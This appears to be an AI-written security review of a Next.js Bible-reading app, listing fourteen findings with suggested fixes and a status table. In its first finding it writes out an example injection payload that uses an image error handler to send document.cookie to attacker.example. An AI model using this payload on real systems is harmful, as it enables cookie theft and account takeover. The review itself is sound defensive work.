# SurfBible Security Review

**Date:** 2026-04-25  
**Scope:** `web/` — Next.js app router, API routes, middleware, email, database schema  
**Reviewer:** Claude Code

---

## Summary

The overall posture is reasonable for an early-stage app. Clerk handles identity correctly, Drizzle ORM eliminates SQL injection, and the security response headers are well-configured. However there are two issues that should be fixed before exposing the app to a wider audience: stored HTML injection in outgoing emails, and unauthenticated access to private plan data.

---

## Findings

### Critical

#### 1. Stored HTML injection in email templates
**Files:** `lib/emails/templates.ts:43,61,89`

`displayName` is user-controlled (set via `PUT /api/user/profile`) and is interpolated directly into HTML email bodies without escaping:

```ts
// templates.ts:43
<p style="...">Hi ${name},</p>
```

A user who sets their display name to `</p><img src=x onerror=fetch('https://attacker.example/'+document.cookie)>` injects arbitrary markup into every email sent to them. Email clients don't execute `<script>` tags, but injected markup can: spoof content, load external images (leaking open/read tracking), inject hidden links, and in some clients run event handlers.

**Fix:** HTML-escape `displayName` before interpolation:

```ts
function escHtml(s: string) {
  return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
}
const name = escHtml(displayName ?? "friend");
```

---

#### 2. Private plans readable without authentication
**File:** `app/api/plans/[id]/route.ts:7-22`

`GET /api/plans/:id` has no auth check and no visibility gate. Any private plan — including church-assigned plans with passage data — is fully readable by an unauthenticated request that knows the UUID:

```ts
export async function GET(_req, { params }) {
  const { id } = await params;
  const [plan] = await db.select().from(plans).where(eq(plans.id, id));
  // no auth, no isPublic check
  return NextResponse.json({ ...plan, days });
}
```

UUIDs are not secret. They appear in the URL bar, referrer headers, and logs.

**Fix:** Require auth and enforce visibility:

```ts
const user = await getDbUser();
if (!plan.isPublic) {
  if (!user) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  const isOwner = plan.createdBy === user.id;
  const isChurchMember = plan.churchId && user.churchId === plan.churchId;
  if (!isOwner && !isChurchMember) {
    return NextResponse.json({ error: "Forbidden" }, { status: 403 });
  }
}
```

---

### High

#### 3. Unsubscribe tokens never expire
**File:** `lib/email.ts:17-36`

`makeUnsubscribeToken` encodes `Date.now()` in the payload, but `verifyUnsubscribeToken` never reads or checks the timestamp — it only verifies the HMAC and extracts `userId`. Tokens issued in the first email ever sent remain valid forever. A token forwarded, screenshot, or leaked in logs will unsubscribe the user at any future point.

**Fix:** Check the timestamp in `verifyUnsubscribeToken` and reject tokens older than, e.g., 90 days:

```ts
const [userId, tsStr] = payload.split(":");
const age = Date.now() - Number(tsStr);
if (age > 90 * 24 * 60 * 60 * 1000) return null;
return userId;
```

---

#### 4. `unsafe-inline` in production CSP weakens XSS protection
**File:** `next.config.ts:28`

`script-src` always includes `'unsafe-inline'`, even in production. This allows any injected inline script to execute, which voids most of the XSS protection that CSP is meant to provide.

```ts
`script-src 'self' 'unsafe-inline'${isDev ? " 'unsafe-eval'" : ""} ${clerkScriptSrc} ...`
```

**Fix:** Switch to nonce-based CSP using Next.js's built-in nonce support. `'unsafe-inline'` is needed only if you have inline scripts you cannot move to external files. In practice, Tailwind and React server components don't need it.

---

#### 5. `CRON_SECRET` used as both a bearer token and an HMAC key
**Files:** `app/api/crons/*/route.ts:10`, `lib/email.ts:19,29`

The same `CRON_SECRET` serves as the cron endpoint bearer token and as the HMAC signing key for unsubscribe tokens. A compromise in either context (e.g., a leaked log line containing the Authorization header, or an attacker who intercepts a token and breaks the HMAC) exposes both.

**Fix:** Use a separate `UNSUBSCRIBE_SECRET` env var for HMAC signing.

---

#### 6. Non-timing-safe secret comparisons
**Files:** `app/api/crons/*/route.ts:10`, `lib/email.ts:30`

All cron routes use a plain `!==` string comparison for the bearer token:

```ts
if (req.headers.get("Authorization") !== `Bearer ${process.env.CRON_SECRET}`)
```

`verifyUnsubscribeToken` does the same for the HMAC:

```ts
if (sig !== expected) return null;
```

Plain string comparison in JavaScript short-circuits on the first differing byte, which is theoretically exploitable via timing to recover the secret byte-by-byte from a network-accessible endpoint.

**Fix:** Use `crypto.timingSafeEqual`:

```ts
import { timingSafeEqual } from "crypto";

function safeCompare(a: string, b: string): boolean {
  const ba = Buffer.from(a);
  const bb = Buffer.from(b);
  return ba.length === bb.length && timingSafeEqual(ba, bb);
}
```

---

### Medium

#### 7. No rate limiting on any endpoint

There is no rate limiting on login attempts, plan enrollments, invite code lookups, or cron endpoints. Notable exposure:

- `POST /api/user/church` and `POST /api/groups/join` accept an `inviteCode` and look it up in the database. Invite codes are 6 random bytes (12 hex chars, ~2^48 space). Without rate limiting, brute-forcing is feasible given enough time.
- `POST /api/user/plans/:id/complete` can be called repeatedly to advance a plan indefinitely.

**Fix:** Add Vercel's built-in rate limiting or use `@upstash/ratelimit` via an Upstash Redis integration. At minimum, rate-limit the invite-code endpoints.

---

#### 8. Unbounded user-controlled text fields accepted by API

`notes` and `reflection` in progress updates, `displayName` in profile, and `name` in groups/churches have no server-side length validation. DB-level `varchar` constraints will cause a cryptic 500 if exceeded. A malformed request with a 10 MB payload will hit the DB before being rejected.

**Fix:** Validate max lengths at the route layer before the DB call, and add a max request body size if needed:

```ts
if (displayName && displayName.length > 100) {
  return NextResponse.json({ error: "displayName too long" }, { status: 400 });
}
```

---

#### 9. `passages` JSONB structure not validated

`POST /api/plans`, `PUT /api/plans/[id]`, and `POST /api/admin/churches/[id]/plans` insert user-supplied `passages` directly into `plan_days.passages` (a JSONB column) with only an `Array.isArray` check. Malformed passage objects (missing `book`, wrong types, extra keys) are stored and will surface as runtime errors in `bookName()` and the read page.

**Fix:** Validate each passage object before insertion:

```ts
for (const p of d.passages) {
  if (typeof p.book !== "string" || typeof p.ref !== "string") {
    return NextResponse.json({ error: "Invalid passage structure" }, { status: 400 });
  }
}
```

---

#### 10. Cron endpoints reachable over the public internet

`/api/crons/*` is listed as public in `proxy.ts` (Clerk doesn't gate it), so these endpoints are reachable without a Clerk session. The CRON_SECRET check is the only guard. If the secret is weak, rotated incorrectly, or leaked, an attacker can trigger mass email sends and streak mutations at will.

**Fix:** In `vercel.json` (or `vercel.ts`), restrict cron invocations to Vercel's internal network using the `protection_bypass` pattern, or set `vercel.json` cron config so Vercel itself calls them — which automatically adds the `Authorization: Bearer` header from the dashboard secret, removing the need to manage it manually.

---

### Low / Informational

#### 11. Incomplete `Permissions-Policy`
**File:** `next.config.ts:18`

The policy blocks `camera`, `microphone`, and `geolocation`, but leaves `payment`, `usb`, `bluetooth`, `interest-cohort` (FLoC), and `display-capture` unrestricted. None of these are used by the app.

**Fix:**
```ts
"Permissions-Policy",
"camera=(), microphone=(), geolocation=(), payment=(), usb=(), display-capture=(), interest-cohort=()"
```

---

#### 12. No deduplication guard on cron email sends

`streak-alert/route.ts` and `reminder/route.ts` insert a `notifications` row after sending but do not check for an existing row first. If a cron function retries (Vercel retries failed functions), duplicate emails are sent within the same hour. The `notifications` table has no unique constraint to prevent this.

**Fix:** Add a unique constraint on `(userId, type, DATE(scheduledAt))` and use `onConflictDoNothing()` on insert, or query for an existing notification before sending.

---

#### 13. Any authenticated user can publish a public plan

`POST /api/plans` accepts `isPublic: true` from any authenticated user with no review step. This allows spam or inappropriate content to appear on the public `/plans` page.

**Fix:** Either restrict `isPublic: true` to an admin role, or default all user-created plans to private and provide a moderation flow.

---

#### 14. Admin invite code returned to all authenticated users via `GET /api/admin/churches`

`GET /api/admin/churches` returns the full church row including `inviteCode` to any authenticated user who belongs to that church, not just the church creator. Any member can share the invite code.

This may be intentional, but if codes are meant to be admin-only, filter the response for non-admin callers.

---

## Positive Observations

- **Clerk integration is correct.** Auth is enforced in `proxy.ts` for all non-public routes, and `getDbUser()` always re-validates the Clerk session server-side before any DB write.
- **Authorization checks are thorough.** All mutable user-plan routes verify `userId === user.id`, admin routes verify `createdBy === user.id`, and group removal checks `isSelf || isAdmin`.
- **SQL injection is structurally prevented.** Drizzle ORM uses parameterized queries throughout.
- **Invite codes use `crypto.randomBytes`.** Cryptographically secure, not `Math.random()`.
- **HMAC-signed unsubscribe tokens.** Correct approach; just needs expiry enforcement (finding #3).
- **HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy** are all correctly set.
- **`unsafe-eval` is correctly gated to dev only** in the CSP.

---

## Fix Status

| # | Finding | Status | Notes |
|---|---------|--------|-------|
| 1 | HTML-escape `displayName` in email templates | ✅ Fixed | `lib/emails/templates.ts` — `esc()` helper applied to all three templates |
| 2 | Auth + visibility check on `GET /api/plans/:id` | ✅ Fixed | `app/api/plans/[id]/route.ts` — 401 for unauthed, 403 if not owner/church member |
| 3 | Unsubscribe tokens never expire | ✅ Fixed | `lib/email.ts` — 90-day expiry enforced in `verifyUnsubscribeToken` |
| 4 | `unsafe-inline` in production CSP | ✅ Fixed | `proxy.ts` + `lib/csp.ts` — nonce-based CSP, `strict-dynamic` in prod; `next.config.ts` static headers retain all other directives |
| 5 | `CRON_SECRET` dual-used as HMAC key | ✅ Fixed | `lib/email.ts` — now uses `UNSUBSCRIBE_SECRET`; new secret generated in `.env.local` |
| 6 | Non-timing-safe comparisons | ✅ Fixed | `lib/cron-auth.ts` — `timingSafeEqual` for all cron auth; HMAC comparison in `verifyUnsubscribeToken` also fixed |
| 7 | No rate limiting | ⏳ Pending | Needs Upstash Redis or Vercel rate limiting integration |
| 8 | Unbounded text field lengths | ✅ Fixed | `displayName` (100), `notes`/`reflection` (10k), `name` (200), `title` (200), `description` (2k) |
| 9 | `passages` JSONB not validated | ✅ Fixed | `lib/plans/validate.ts` — `validateDays()` used in all three plan-creation routes |
| 10 | Cron endpoints public-internet-accessible | ⏳ Pending | Mitigated by timing-safe secret; full fix requires Vercel cron config |
| 11 | Incomplete Permissions-Policy | ✅ Fixed | `next.config.ts` — added `payment`, `usb`, `bluetooth`, `display-capture`, `interest-cohort` |
| 12 | No dedup guard on cron email sends | ✅ Fixed | All three email crons check for existing sent notification before sending |
| 13 | Any user can publish public plans | ✅ Fixed | `POST /api/plans` — `isPublic` input ignored; user plans always private |
| 14 | Admin invite code exposed to all members | ℹ️ Accepted | Intentional: members need the code to invite others; no change |
